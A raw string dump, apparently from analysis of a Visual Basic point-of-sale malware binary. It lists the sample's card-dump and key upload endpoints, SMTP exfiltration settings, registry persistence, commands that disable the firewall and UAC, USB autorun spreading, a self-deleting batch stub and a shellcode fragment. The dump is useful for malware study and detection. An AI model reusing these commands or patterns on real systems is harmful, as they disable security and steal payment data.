[Strings]
nth  paddr      vaddr      len size section type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
1826 0x0001e1a4 0x0041eda4 7   16   .text   utf16le Caption
1827 0x0001e1b8 0x0041edb8 73  148  .text   utf16le cmd /c REG DELETE HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "
1828 0x0001e26b 0x0041ee6b 10  11   .text   ascii   Rgentables
1829 0x0001e278 0x0041ee78 4   5    .text   ascii   gkey
1830 0x0001e280 0x0041ee80 7   8    .text   ascii   Encrypt
1831 0x0001e288 0x0041ee88 7   8    .text   ascii   Decrypt
1832 0x0001e290 0x0041ee90 11  12   .text   ascii   EncryptData
1833 0x0001e29c 0x0041ee9c 11  12   .text   ascii   DecryptData
1834 0x0001e2b4 0x0041eeb4 9   20   .text   utf16le cryptData
1835 0x0001e2e4 0x0041eee4 11  24   .text   utf16le DUMPSCANNER
1836 0x0001e338 0x0041ef38 9   20   .text   utf16le winmgmts:
1837 0x0001e34c 0x0041ef4c 9   20   .text   utf16le ExecQuery
1838 0x0001e634 0x0041f234 10  22   .text   utf16le Microsoft 
1839 0x0001e690 0x0041f290 17  36   .text   utf16le New Infected POS.
1840 0x0001e6d4 0x0041f2d4 70  142  .text   utf16le cmd /c REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "
1841 0x0001e76c 0x0041f36c 14  30   .text   utf16le /t REG_SZ /d "
1842 0x0001e794 0x0041f394 16  34   .text   utf16le 892358092376.bat
1843 0x0001e7bc 0x0041f3bc 8   18   .text   utf16le USERNAME
1844 0x0001e7d8 0x0041f3d8 15  32   .text   utf16le O.Configuration
1845 0x0001e800 0x0041f400 70  142  .text   utf16le cmd /c REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "
1846 0x0001e894 0x0041f494 157 316  .text   utf16le cmd /c REG ADD HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v "DoNotAllowExceptions" /t REG_DWORD /d "0" /f
1847 0x0001e9d0 0x0041f5d0 13  28   .text   utf16le AddAttachment
1848 0x0001e9f4 0x0041f5f4 141 284  .text   utf16le cmd /c REG ADD HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List /v "
1849 0x0001eb14 0x0041f714 12  26   .text   utf16le :*:Enabled: 
1850 0x0001eb34 0x0041f734 9   20   .text   utf16le @echo off
1851 0x0001eb58 0x0041f758 22  46   .text   utf16le ng 127.0.0.1 -n 3 >nul
1852 0x0001ebb0 0x0041f7b0 4   10   .text   utf16le l %0
1853 0x0001ebc0 0x0041f7c0 115 232  .text   utf16le cmd /c REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v "EnableLUA" /t REG_DWORD /d "0" /f
1854 0x0001ecac 0x0041f8ac 101 204  .text   utf16le cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Security Center" /v "UACDisableNotify" /t REG_DWORD /d "0" /f
1855 0x0001ed80 0x0041f980 16  34   .text   utf16le 849567956796.bat
1856 0x0001edac 0x0041f9ac 29  60   .text   utf16le nNT://./Administratoren,group
1857 0x0001ede8 0x0041f9e8 7   16   .text   utf16le Members
1858 0x0001edf8 0x0041f9f8 4   10   .text   utf16le name
1859 0x0001ee38 0x0041fa38 18  38   .text   utf16le t/key.php HTTP/1.1
1860 0x0001ee68 0x0041fa68 45  92   .text   utf16le ntent-Type: application/x-www-form-urlencoded
1861 0x0001eecc 0x0041facc 19  40   .text   utf16le nnection: keepalive
1862 0x0001eefc 0x0041fafc 14  30   .text   utf16le ntent-Length: 
1863 0x0001ef48 0x0041fb48 8   18   .text   utf16le HTMLBody
1864 0x0001ef64 0x0041fb64 21  44   .text   utf16le t/dumper.php HTTP/1.1
1865 0x0001ef9c 0x0041fb9c 13  28   .text   utf16le WScript.Shell
1866 0x0001efc0 0x0041fbc0 32  66   .text   utf16le hortcut to Internet Explorer.lnk
1867 0x0001f004 0x0041fc04 14  30   .text   utf16le CreateShortcut
1868 0x0001f024 0x0041fc24 10  22   .text   utf16le TargetPath
1869 0x0001f040 0x0041fc40 10  22   .text   utf16le InstallDir
1870 0x0001f058 0x0041fc58 24  50   .text   utf16le ExpandEnvironmentStrings
1871 0x0001f08c 0x0041fc8c 16  34   .text   utf16le WorkingDirectory
1872 0x0001f0b0 0x0041fcb0 11  24   .text   utf16le WindowStyle
1873 0x0001f0c8 0x0041fcc8 12  26   .text   utf16le IconLocation
1874 0x0001f0e4 0x0041fce4 4   10   .text   utf16le Save
1875 0x0001f0f4 0x0041fcf4 11  24   .text   utf16le CDO.Message
1876 0x0001f10c 0x0041fd0c 6   14   .text   utf16le Fields
1877 0x0001f124 0x0041fd24 45  92   .text   utf16le tp://schemas.microsoft.com/cdo/configuration/
1878 0x0001f184 0x0041fd84 9   20   .text   utf16le sendusing
1879 0x0001f198 0x0041fd98 4   10   .text   utf16le Item
1880 0x0001f1a8 0x0041fda8 10  22   .text   utf16le smtpserver
1881 0x0001f1c4 0x0041fdc4 14  30   .text   utf16le smtpserverport
1882 0x0001f1ec 0x0041fdec 14  30   .text   utf16le tpauthenticate
1883 0x0001f210 0x0041fe10 12  26   .text   utf16le sendusername
1884 0x0001f230 0x0041fe30 12  26   .text   utf16le sendpassword
1885 0x0001f250 0x0041fe50 10  22   .text   utf16le smtpusessl
1886 0x0001f268 0x0041fe68 6   14   .text   utf16le Update
1887 0x0001f290 0x0041fe90 25  52   .text   utf16le Fighter@ctclubedeluta.org
1888 0x0001f2c4 0x0041fec4 4   10   .text   utf16le from
1889 0x0001f2d0 0x0041fed0 7   16   .text   utf16le Subject
1890 0x0001f2e0 0x0041fee0 13  28   .text   utf16le Configuration
1891 0x0001f2fc 0x0041fefc 4   10   .text   utf16le Send
1892 0x0001f430 0x00420030 12  13   .text   ascii   __vbaOnError
1893 0x0001f448 0x00420048 54  110  .text   utf16le nmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2
1894 0x0001f4c0 0x004200c0 29  60   .text   utf16le lect * from Win32_LogicalDisk
1895 0x0001f4fc 0x004200fc 9   20   .text   utf16le DriveType
1896 0x0001f524 0x00420124 17  36   .text   utf16le stallExplorer.exe
1897 0x0001f54c 0x0042014c 11  24   .text   utf16le autorun.inf
1898 0x0001f568 0x00420168 9   20   .text   utf16le [autorun]
1899 0x0001f584 0x00420184 22  46   .text   utf16le en=InstallExplorer.exe
1900 0x0001f5b4 0x004201b4 8   9    .text   ascii   VBA6.DLL
1901 0x0001f5c0 0x004201c0 18  19   .text   ascii   __vbaLateMemCallLd
1902 0x0001f5d4 0x004201d4 13  14   .text   ascii   __vbaVarTstGt
1903 0x0001f5e4 0x004201e4 12  13   .text   ascii   __vbaDateVar
1904 0x0001f5f4 0x004201f4 9   10   .text   ascii   __vbaFpI4
1905 0x0001f600 0x00420200 20  21   .text   ascii   __vbaVarSetObjAddref
1906 0x0001f618 0x00420218 19  20   .text   ascii   __vbaVarLateMemStAd
1907 0x0001f62c 0x0042022c 21  22   .text   ascii   __vbaVarLateMemCallSt
1908 0x0001f644 0x00420244 16  17   .text   ascii   __vbaLateMemCall
1909 0x0001f658 0x00420258 17  18   .text   ascii   __vbaVarLateMemSt
1910 0x0001f66c 0x0042026c 14  15   .text   ascii   __vbaVarSetVar
1911 0x0001f67c 0x0042027c 18  19   .text   ascii   __vbaVarVargNofree
1912 0x0001f690 0x00420290 13  14   .text   ascii   __vbaInStrVar
1913 0x0001f6a0 0x004202a0 13  14   .text   ascii   __vbaVarCmpGt
1914 0x0001f6b0 0x004202b0 18  19   .text   ascii   __vbaRedimPreserve
1915 0x0001f6c4 0x004202c4 15  16   .text   ascii   __vbaVarForNext
1916 0x0001f6d4 0x004202d4 15  16   .text   ascii   __vbaVarForInit
1917 0x0001f6e4 0x004202e4 11  12   .text   ascii   __vbaLenVar
1918 0x0001f6f0 0x004202f0 12  13   .text   ascii   __vbaLenBstr
1919 0x0001f700 0x00420300 13  14   .text   ascii   __vbaExitProc
1920 0x0001f710 0x00420310 19  20   .text   ascii   __vbaNextEachCollAd
1921 0x0001f724 0x00420324 17  18   .text   ascii   __vbaExitEachColl
1922 0x0001f738 0x00420338 10  11   .text   ascii   __vbaStrR8
1923 0x0001f744 0x00420344 18  19   .text   ascii   __vbaForEachCollAd
1924 0x0001f758 0x00420358 20  21   .text   ascii   __vbaNextEachCollVar
1925 0x0001f770 0x00420370 19  20   .text   ascii   __vbaForEachCollVar
1926 0x0001f784 0x00420384 11  12   .text   ascii   __vbaObjVar
1927 0x0001f790 0x00420390 17  18   .text   ascii   __vbaObjSetAddref
1928 0x0001f7a4 0x004203a4 10  11   .text   ascii   __vbaErase
1929 0x0001f7b0 0x004203b0 14  15   .text   ascii   __vbaPutOwner4
1930 0x0001f7c8 0x004203c8 14  15   .text   ascii   __vbaPrintFile
1931 0x0001f7d8 0x004203d8 12  13   .text   ascii   __vbaAryLock
1932 0x0001f7e8 0x004203e8 21  22   .text   ascii   __vbaVarLateMemCallLd
1933 0x0001f800 0x00420400 12  13   .text   ascii   __vbaVar2Vec
1934 0x0001f810 0x00420410 12  13   .text   ascii   __vbaStr2Vec
1935 0x0001f820 0x00420420 12  13   .text   ascii   __vbaAryMove
1936 0x0001f830 0x00420430 13  14   .text   ascii   __vbaVarTstNe
1937 0x0001f840 0x00420440 14  15   .text   ascii   __vbaVarSetObj
1938 0x0001f850 0x00420450 17  18   .text   ascii   __vbaStrToUnicode
1939 0x0001f864 0x00420464 14  15   .text   ascii   __vbaAryUnlock
1940 0x0001f874 0x00420474 24  25   .text   ascii   __vbaVarIndexLoadRefLock
1941 0x0001f890 0x00420490 17  18   .text   ascii   __vbaVarIndexLoad
1942 0x0001f8a4 0x004204a4 10  11   .text   ascii   __vbaFPInt
1943 0x0001f8b0 0x004204b0 12  13   .text   ascii   __vbaStrLike
1944 0x0001f8c0 0x004204c0 13  14   .text   ascii   __vbaVarTstEq
1945 0x0001f8d0 0x004204d0 11  12   .text   ascii   __vbaVarAdd
1946 0x0001f8dc 0x004204dc 15  16   .text   ascii   __vbaStrVarMove
1947 0x0001f8ec 0x004204ec 18  19   .text   ascii   __vbaErrorOverflow
1948 0x0001f900 0x00420500 12  13   .text   ascii   __vbaAryCopy
1949 0x0001f910 0x00420510 16  17   .text   ascii   __vbaAryDestruct
1950 0x0001f924 0x00420524 9   10   .text   ascii   __vbaI2I4
1951 0x0001f930 0x00420530 11  12   .text   ascii   __vbaUbound
1952 0x0001f93c 0x0042053c 24  25   .text   ascii   __vbaGenerateBoundsError
1953 0x0001f958 0x00420558 11  12   .text   ascii   __vbaStrCmp
1954 0x0001f964 0x00420564 11  12   .text   ascii   __vbaAryVar
1955 0x0001f970 0x00420570 12  13   .text   ascii   __vbaStrCopy
1956 0x0001f980 0x00420580 14  15   .text   ascii   __vbaFileClose
1957 0x0001f990 0x00420590 17  18   .text   ascii   __vbaLineInputStr
1958 0x0001f9a4 0x004205a4 10  11   .text   ascii   __vbaI2Var
1959 0x0001f9b0 0x004205b0 9   10   .text   ascii   __vbaNew2
1960 0x0001f9bc 0x004205bc 13  14   .text   ascii   __vbaFileOpen
1961 0x0001f9cc 0x004205cc 10  11   .text   ascii   __vbaI4Var
1962 0x0001f9d8 0x004205d8 14  15   .text   ascii   __vbaStrVarVal
1963 0x0001f9e8 0x004205e8 8   9    .text   ascii   __vbaNew
1964 0x0001f9f4 0x004205f4 16  17   .text   ascii   __vbaFreeObjList
1965 0x0001fa08 0x00420608 16  17   .text   ascii   __vbaFreeStrList
1966 0x0001fa1c 0x0042061c 11  12   .text   ascii   __vbaVarCat
1967 0x0001fa28 0x00420628 13  14   .text   ascii   __vbaVarCmpEq
1968 0x0001fa38 0x00420638 11  12   .text   ascii   __vbaVarNot
1969 0x0001fa44 0x00420644 16  17   .text   ascii   __vbaBoolVarNull
1970 0x0001fa58 0x00420658 12  13   .text   ascii   __vbaBoolVar
1971 0x0001fa68 0x00420668 8   9    .text   ascii   __vbaEnd
1972 0x0001fa74 0x00420674 11  12   .text   ascii   __vbaObjSet
1973 0x0001fa80 0x00420680 19  20   .text   ascii   __vbaSetSystemError
1974 0x0001fa94 0x00420694 14  15   .text   ascii   __vbaStrToAnsi
1975 0x0001faa4 0x004206a4 12  13   .text   ascii   __vbaFreeObj
1976 0x0001fab4 0x004206b4 20  21   .text   ascii   __vbaHresultCheckObj
1977 0x0001facc 0x004206cc 16  17   .text   ascii   __vbaFreeVarList
1978 0x0001fae0 0x004206e0 12  13   .text   ascii   __vbaFreeStr
1979 0x0001faf0 0x004206f0 11  12   .text   ascii   __vbaVarDup
1980 0x0001fafc 0x004206fc 12  13   .text   ascii   __vbaStrMove
1981 0x0001fb0c 0x0042070c 11  12   .text   ascii   __vbaStrCat
1982 0x0001fb18 0x00420718 12  13   .text   ascii   __vbaVarMove
1983 0x0001fb28 0x00420728 12  13   .text   ascii   __vbaVarCopy
1984 0x0001fb38 0x00420738 10  11   .text   ascii   __vbaRedim
1985 0x0001fb44 0x00420744 12  13   .text   ascii   __vbaFreeVar
1986 0x0001fb5c 0x0042075c 26  54   .text   utf16le  Winsock service initiated
1987 0x0001fb9c 0x0042079c 24  50   .text   utf16le eration now in progress.
1988 0x0001fbd8 0x004207d8 38  78   .text   utf16le ROR trying to initiate winsock service
1989 0x0001fc30 0x00420830 29  60   .text   utf16le dSocketPlus.InitiateProcesses
1990 0x0001fc74 0x00420874 29  60   .text   utf16le dSocketPlus.FinalizeProcesses
1991 0x0001fcb8 0x004208b8 26  54   .text   utf16le  Winsock service finalized
1992 0x0001fcf8 0x004208f8 16  34   .text   utf16le rmission denied.
1993 0x0001fd24 0x00420924 21  44   .text   utf16le dress already in use.
1994 0x0001fd58 0x00420958 30  62   .text   utf16le nnot assign requested address.
1995 0x0001fda0 0x004209a0 46  94   .text   utf16le dress family not supported by protocol family.
1996 0x0001fe08 0x00420a08 28  58   .text   utf16le eration already in progress.
1997 0x0001fe4c 0x00420a4c 31  64   .text   utf16le ftware caused connection abort.
1998 0x0001fe94 0x00420a94 17  36   .text   utf16le nnection refused.
1999 0x0001fec0 0x00420ac0 23  48   .text   utf16le nnection reset by peer.
2000 0x0001fef8 0x00420af8 27  56   .text   utf16le stination address required.
2001 0x0001ff34 0x00420b34 12  26   .text   utf16le Bad address.
2002 0x0001ff58 0x00420b58 15  32   .text   utf16le  route to host.
2003 0x0001ff80 0x00420b80 24  50   .text   utf16le terrupted function call.
2004 0x0001ffbc 0x00420bbc 15  32   .text   utf16le valid argument.
2005 0x0001ffe4 0x00420be4 26  54   .text   utf16le cket is already connected.
2006 0x00020024 0x00420c24 18  38   .text   utf16le o many open files.
2007 0x00020054 0x00420c54 15  32   .text   utf16le ssage too long.
2008 0x0002007c 0x00420c7c 14  30   .text   utf16le twork is down.
2009 0x000200a4 0x00420ca4 34  70   .text   utf16le twork dropped connection on reset.
2010 0x000200f4 0x00420cf4 21  44   .text   utf16le twork is unreachable.
2011 0x00020124 0x00420d24 14  30   .text   utf16le SetWindowLongA
2012 0x0002014c 0x00420d4c 24  50   .text   utf16le  buffer space available.
2013 0x00020188 0x00420d88 18  38   .text   utf16le d protocol option.
2014 0x000201b8 0x00420db8 22  46   .text   utf16le cket is not connected.
2015 0x000201f0 0x00420df0 28  58   .text   utf16le cket operation on nonsocket.
2016 0x00020234 0x00420e34 22  46   .text   utf16le eration not supported.
2017 0x0002026c 0x00420e6c 28  58   .text   utf16le otocol family not supported.
2018 0x000202b0 0x00420eb0 17  36   .text   utf16le o many processes.
2019 0x000202dc 0x00420edc 21  44   .text   utf16le otocol not supported.
2020 0x00020310 0x00420f10 29  60   .text   utf16le otocol wrong type for socket.
2021 0x00020354 0x00420f54 32  66   .text   utf16le nnot send after socket shutdown.
2022 0x000203a0 0x00420fa0 24  50   .text   utf16le cket type not supported.
2023 0x000203dc 0x00420fdc 19  40   .text   utf16le nnection timed out.
2024 0x0002040c 0x0042100c 31  64   .text   utf16le source temporarily unavailable.
2025 0x00020450 0x00421050 15  32   .text   utf16le Host not found.
2026 0x00020478 0x00421078 38  78   .text   utf16le ccessful WSAStartup not yet performed.
2027 0x000204d0 0x004210d0 43  88   .text   utf16le lid name, no data record of requested type.
2028 0x00020530 0x00421130 29  60   .text   utf16le is is a nonrecoverable error.
2029 0x00020574 0x00421174 31  64   .text   utf16le twork subsystem is unavailable.
2030 0x000205bc 0x004211bc 30  62   .text   utf16le nauthoritative host not found.
2031 0x00020604 0x00421204 31  64   .text   utf16le nsock.dll version out of range.
2032 0x00020648 0x00421248 14  30   .text   utf16le Unknown error.
2033 0x00020670 0x00421270 4   10   .text   utf16le ATIC
2034 0x00020680 0x00421280 13  28   .text   utf16le SOCKET_WINDOW
2035 0x000206a4 0x004212a4 32  66   .text   utf16le  Created winsock message window 
2036 0x000206f0 0x004212f0 29  60   .text   utf16le RNING lngWindowHandle is ZERO
2037 0x00020734 0x00421334 39  80   .text   utf16le dSocketPlus.DestroyWinsockMessageWindow
2038 0x00020788 0x00421388 13  28   .text   utf16le Out of memory
2039 0x000207ac 0x004213ac 34  70   .text   utf16le  Destroyed winsock message window 
2040 0x0002082c 0x0042142c 21  44   .text   utf16le  Created socket array
2041 0x00020860 0x00421460 4   10   .text   utf16le Mode
2042 0x00020874 0x00421474 26  54   .text   utf16le dSocketPlus.RegisterSocket
2043 0x000208b4 0x004214b4 42  86   .text   utf16le ROR trying to register events from socket 
2044 0x00020914 0x00421514 31  64   .text   utf16le  Registered events from socket 
2045 0x00020964 0x00421564 23  48   .text   utf16le  Destroyed socket array
2046 0x0002099c 0x0042159c 26  54   .text   utf16le  Created accept collection
2047 0x000209d8 0x004215d8 15  32   .text   utf16le Temporal_Socket
2048 0x00020a00 0x00421600 28  58   .text   utf16le  Destroyed accept collection
2049 0x00020a40 0x00421640 15  32   .text   utf16le CallWindowProcA
2050 0x00020a64 0x00421664 10  22   .text   utf16le WSACleanup
2051 0x00020a80 0x00421680 9   20   .text   utf16le KillTimer
2052 0x00020abc 0x004216bc 4   10   .text   utf16le er32
2053 0x00020ad0 0x004216d0 4   10   .text   utf16le 2_32
2054 0x00020af0 0x004216f0 31  64   .text   utf16le  Subclass memory allocated at: 
2055 0x00020b38 0x00421738 27  56   .text   utf16le  Freed subclass memory at: 
2056 0x00020b78 0x00421778 32  66   .text   utf16le RNING: Async already registered!
2057 0x00020bc4 0x004217c4 33  68   .text   utf16le RNING: Socket already registered!
2058 0x00020c10 0x00421810 390 782  .text   utf16le 5850505589E55753515231C0FCEB09E8xxxxx01x85C074258B45103D0080000074543D01800000746CE8310000005A595B5FC9C21400E824000000EBF168xxxxx02x6AFCFF750CE8xxxxx03xE8xxxxx04x68xxxxx05x6A00E8xxxxx06xEBCFFF7518FF7514FF7510FF750C68xxxxx07xE8xxxxx08xC3BBxxxxx09x8B4514BFxxxxx0Ax89D9F2AF75A529CB4B8B1C9Dxxxxx0BxEB1DBBxxxxx0Cx8B4514BFxxxxx0Dx89D9F2AF758629CB4B8B1C9Dxxxxx0Ex895D088B1B8B5B1C89D85A595B5FC9FFE0
2059 0x00020f20 0x00421b20 13  14   .text   ascii   __vbaLenBstrB
2060 0x00020f30 0x00421b30 10  11   .text   ascii   __vbaFpUI1
2061 0x00020f3c 0x00421b3c 15  16   .text   ascii   __vbaCastObjVar
2062 0x00020f4c 0x00421b4c 12  13   .text   ascii   __vbaCastObj
2063 0x00020f5c 0x00421b5c 10  11   .text   ascii   __vbaStrI4
2064 0x00020f68 0x00421b68 10  11   .text   ascii   __vbaObjIs
2065 0x00020f74 0x00421b74 10  11   .text   ascii   __vbaError
2066 0x00020f80 0x00421b80 17  18   .text   ascii   __vbaRecAnsiToUni
2067 0x00020f94 0x00421b94 17  18   .text   ascii   __vbaRecUniToAnsi
2068 0x00020fb0 0x00421bb0 20  42   .text   utf16le ocketPlus.RemotePort
2069 0x00020fe4 0x00421be4 32  66   .text   utf16le valid operation at current state
2070 0x0002102c 0x00421c2c 90  182  .text   utf16le The argument passed to a function was not in the correct format or in the specified range.
2071 0x000210ec 0x00421cec 20  42   .text   utf16le ocketPlus.RemoteHost
2072 0x00021120 0x00421d20 19  40   .text   utf16le ocketPlus.LocalPort
2073 0x00021150 0x00421d50 18  38   .text   utf16le ocketPlus.Protocol
2074 0x00021180 0x00421d80 16  34   .text   utf16le ocketPlus.Accept
2075 0x000211a8 0x00421da8 75  152  .text   utf16le Wrong protocol or connection state for the requested transaction or request
2076 0x00021248 0x00421e48 17  36   .text   utf16le ATE: sckConnected
2077 0x00021274 0x00421e74 15  32   .text   utf16le ATE: sckClosing
2078 0x000212a0 0x00421ea0 10  22   .text   utf16le OK Added '
2079 0x000212c0 0x00421ec0 19  40   .text   utf16le to the socket array
2080 0x000212f0 0x00421ef0 18  38   .text   utf16le ocketPlus.ArrayAdd
2081 0x00021320 0x00421f20 21  44   .text   utf16le supported index type.
2082 0x00021354 0x00421f54 61  124  .text   utf16le is index is already associated with an element of this array.
2083 0x000213d8 0x00421fd8 21  44   .text   utf16le ocketPlus.ArrayRemove
2084 0x00021408 0x00422008 12  26   .text   utf16le OK Removed '
2085 0x0002142c 0x0042202c 21  44   .text   utf16le from the socket array
2086 0x00021460 0x00422060 25  52   .text   utf16le ocketPlus.ArrayIndexInUse
2087 0x0002149c 0x0042209c 14  30   .text   utf16le ocketPlus.Bind
2088 0x000214c0 0x004220c0 14  30   .text   utf16le STATE: sckOpen
2089 0x000214e8 0x004220e8 14  30   .text   utf16le ATE: sckClosed
2090 0x00021510 0x00422110 17  36   .text   utf16le ocketPlus.Connect
2091 0x0002153c 0x0042213c 23  48   .text   utf16le supported variant type.
2092 0x00021574 0x00422174 17  36   .text   utf16le ocketPlus.GetData
2093 0x000215a0 0x004221a0 29  60   .text   utf16le  Bytes obtained from buffer: 
2094 0x000215e4 0x004221e4 16  34   .text   utf16le ocketPlus.Listen
2095 0x00021610 0x00422210 17  36   .text   utf16le ATE: sckListening
2096 0x0002163c 0x0042223c 18  38   .text   utf16le ocketPlus.PeekData
2097 0x0002166c 0x0042226c 18  38   .text   utf16le ocketPlus.SendData
2098 0x00021698 0x00422298 15  32   .text   utf16le STATE: sckError
2099 0x000216c0 0x004222c0 14  30   .text   utf16le CDisableNotify
2100 0x000216e8 0x004222e8 23  48   .text   utf16le ocketPlus.DestroySocket
2101 0x00021720 0x00422320 18  38   .text   utf16le  Destroyed socket 
2102 0x00021750 0x00422350 27  56   .text   utf16le ROR trying to create socket
2103 0x00021790 0x00422390 22  46   .text   utf16le ocketPlus.SocketExists
2104 0x000217c8 0x004223c8 17  36   .text   utf16le  Created socket: 
2105 0x000217fc 0x004223fc 20  42   .text   utf16le ATE: sckHostResolved
2106 0x00021854 0x00422454 20  42   .text   utf16le ocketPlus.PostSocket
2107 0x00021884 0x00422484 11  24   .text   utf16le FD_CONNECT 
2108 0x000218a4 0x004224a4 26  54   .text   utf16le RNING: Omitting FD_CONNECT
2109 0x000218e0 0x004224e0 9   20   .text   utf16le FD_WRITE 
2110 0x000218fc 0x004224fc 24  50   .text   utf16le RNING: Omitting FD_WRITE
2111 0x00021934 0x00422534 8   18   .text   utf16le FD_READ 
2112 0x00021950 0x00422550 23  48   .text   utf16le RNING: Omitting FD_READ
2113 0x00021984 0x00422584 10  22   .text   utf16le FD_ACCEPT 
2114 0x000219a4 0x004225a4 25  52   .text   utf16le RNING: Omitting FD_ACCEPT
2115 0x000219e0 0x004225e0 18  38   .text   utf16le  Accepted socket: 
2116 0x00021a10 0x00422610 25  52   .text   utf16le  Closed accepted socket: 
2117 0x00021a48 0x00422648 9   20   .text   utf16le FD_CLOSE 
2118 0x00021a64 0x00422664 24  50   .text   utf16le RNING: Omitting FD_CLOSE
2119 0x00021aa0 0x004226a0 21  44   .text   utf16le ocketPlus.ConnectToIP
2120 0x00021ad4 0x004226d4 16  34   .text   utf16le  Connecting to: 
2121 0x00021b00 0x00422700 18  38   .text   utf16le ATE: sckConnecting
2122 0x00021b30 0x00422730 22  46   .text   utf16le ocketPlus.BindInternal
2123 0x00021b68 0x00422768 14  30   .text   utf16le valid argument
2124 0x00021b8c 0x0042278c 14  30   .text   utf16le OK Bind HOST: 
2125 0x00021bb0 0x004227b0 7   16   .text   utf16le  PORT: 
2126 0x00021bc8 0x004227c8 24  50   .text   utf16le  Freed resolution memory
2127 0x00021c04 0x00422804 26  54   .text   utf16le ocketPlus.GetLocalHostName
2128 0x00021c44 0x00422844 20  42   .text   utf16le ocketPlus.GetLocalIP
2129 0x00021c78 0x00422878 21  44   .text   utf16le ATE: sckResolvingHost
2130 0x00021cac 0x004228ac 27  56   .text   utf16le ocketPlus.ResolveIfHostname
2131 0x00021ce8 0x004228e8 15  32   .text   utf16le Resolving host 
2132 0x00021d0c 0x0042290c 13  28   .text   utf16le  with handle 
2133 0x00021d3c 0x0042293c 29  60   .text   utf16le ror trying to allocate memory
2134 0x00021d80 0x00422980 29  60   .text   utf16le ocketPlus.SendBufferedDataUDP
2135 0x00021dc4 0x004229c4 35  72   .text   utf16le RNING: Send buffer full, waiting...
2136 0x00021e14 0x00422a14 26  54   .text   utf16le ocketPlus.SendBufferedData
2137 0x00021e50 0x00422a50 15  32   .text   utf16le OK Bytes sent: 
2138 0x00021e78 0x00422a78 17  36   .text   utf16le  Finished SENDING
2139 0x00021ea4 0x00422aa4 26  54   .text   utf16le ocketPlus.RecvDataToBuffer
2140 0x00021ee4 0x00422ae4 24  50   .text   utf16le ocketPlus.ProcessOptions
2141 0x00021f20 0x00422b20 29  60   .text   utf16le nsock buffer size for sends: 
2142 0x00021f64 0x00422b64 32  66   .text   utf16le nsock buffer size for receives: 
2143 0x00021fb0 0x00422bb0 18  38   .text   utf16le ocketPlus.RecvData
2144 0x00021fe0 0x00422be0 25  52   .text   utf16le ocketPlus.GetBufferLenTCP
2145 0x0002201c 0x00422c1c 26  54   .text   utf16le ocketPlus.CleanSocketArray
2146 0x0002205c 0x00422c5c 28  58   .text   utf16le ocketPlus.GetFreeSocketIndex
2147 0x000220a0 0x00422ca0 24  50   .text   utf16le ocketPlus.GetSocketIndex
2148 0x000220d8 0x00422cd8 14  30   .text   utf16le Unknown index.
2149 0x000220f8 0x00422cf8 16  17   .text   ascii   __vbaVargVarCopy
2150 0x0002210c 0x00422d0c 10  11   .text   ascii   __vbaInStr
2151 0x00022118 0x00422d18 18  19   .text   ascii   __vbaAryConstruct2
2152 0x0002212c 0x00422d2c 15  16   .text   ascii   __vbaLsetFixstr
2153 0x0002213c 0x00422d3c 20  21   .text   ascii   __vbaFixstrConstruct
2154 0x00022154 0x00422d54 13  14   .text   ascii   __vbaVarCmpLt
2155 0x00022164 0x00422d64 10  11   .text   ascii   __vbaVarOr
2156 0x00022170 0x00422d70 11  12   .text   ascii   __vbaStrUI1
2157 0x0002217c 0x00422d7c 13  14   .text   ascii   __vbaR4ErrVar
2158 0x0002218c 0x00422d8c 13  14   .text   ascii   __vbaI2ErrVar
2159 0x0002219c 0x00422d9c 13  14   .text   ascii   __vbaR8ErrVar
2160 0x000221ac 0x00422dac 11  12   .text   ascii   __vbaDateR8
2161 0x000221b8 0x00422db8 13  14   .text   ascii   __vbaCyErrVar
2162 0x000221c8 0x00422dc8 14  15   .text   ascii   __vbaUI1ErrVar
2163 0x000221dc 0x00422ddc 15  16   .text   ascii   __vbaBoolErrVar
2164 0x000221ec 0x00422dec 16  17   .text   ascii   __vbaVargVarMove
2165 0x00022200 0x00422e00 13  14   .text   ascii   __vbaI4ErrVar
2166 0x00022210 0x00422e10 18  19   .text   ascii   __vbaStrErrVarCopy
2167 0x00022224 0x00422e24 14  15   .text   ascii   __vbaRefVarAry
